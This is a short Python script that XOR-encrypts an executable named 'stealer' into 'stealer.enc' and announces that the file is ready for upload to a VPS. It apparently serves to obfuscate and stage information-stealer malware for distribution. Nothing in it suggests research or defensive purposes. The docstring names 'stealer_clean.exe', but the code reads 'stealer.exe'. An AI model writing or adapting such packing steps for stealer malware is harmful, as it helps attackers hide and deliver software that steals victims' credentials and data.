#!/usr/bin/env python3
"""
Encrypt stealer_clean.exe to stealer.enc using XOR encryption
"""

XOR_KEY = 0x5A

def xor_encrypt_file(input_path, output_path):
    """Encrypt file with XOR"""
    print(f"📖 Reading: {input_path}")
    with open(input_path, 'rb') as f:
        data = f.read()
    
    print(f"🔒 Encrypting {len(data):,} bytes with XOR key 0x{XOR_KEY:02X}...")
    encrypted = bytes([b ^ XOR_KEY for b in data])
    
    print(f"💾 Writing: {output_path}")
    with open(output_path, 'wb') as f:
        f.write(encrypted)
    
    print(f"✅ Encrypted successfully! Size: {len(encrypted):,} bytes")
    return len(encrypted)

if __name__ == '__main__':
    input_file = 'stealer/stealer.exe'
    output_file = 'stealer/stealer.enc'
    
    size = xor_encrypt_file(input_file, output_file)
    
    print(f"\n✨ stealer.enc is ready for upload to VPS!")
    print(f"📦 File size: {size / 1024 / 1024:.2f} MB")
